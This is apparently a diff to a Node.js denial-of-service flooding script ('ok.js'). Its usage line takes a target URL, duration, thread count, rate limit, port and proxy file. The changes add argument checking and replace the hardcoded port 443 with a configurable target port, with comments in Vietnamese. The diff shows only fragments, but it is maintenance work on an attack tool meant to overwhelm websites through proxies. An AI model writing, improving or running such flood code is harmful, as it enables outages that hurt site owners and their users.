@@ -11,12 +11,19 @@ process.setMaxListeners(0);
 process.on('uncaughtException', function (e) { console.log(e) });
 process.on('unhandledRejection', function (e) { console.log(e) });
 
+if (process.argv.length < 8) {
+    console.error("Usage: node ok.js <URL> <TIME> <THREADS> <RATELIMIT> <PORT> <PROXY_FILE>");
+    process.exit(1);
+}
+
+
 const NORMAL = process.env.NORMAL || "0";
 const target = process.argv[2];
 const time = process.argv[3];
 const threads = process.argv[4];
 const ratelimit = process.argv[5];
-const port = process.argv[6];
+const port = parseInt(process.argv[6], 10); // Chuyển đổi cổng thành số
+
 var mqfi9qjkf3i;
 
 console.log(NORMAL);
@@ -190,7 +197,7 @@ function go() {
 
     if (NORMAL === 1) {
         const netSocket = net.connect({
-            port: 443,
+            port: port, // Sử dụng giá trị cổng đã được kiểm tra
             host: url.host,
             localAddress: ip_address
         }, () => {
@@ -721,7 +728,7 @@ function go() {
             if (SocketTLS) {
                 SocketTLS.end(() => { SocketTLS.destroy(); go() })
             }
-        })
+        });
     }
 }
 
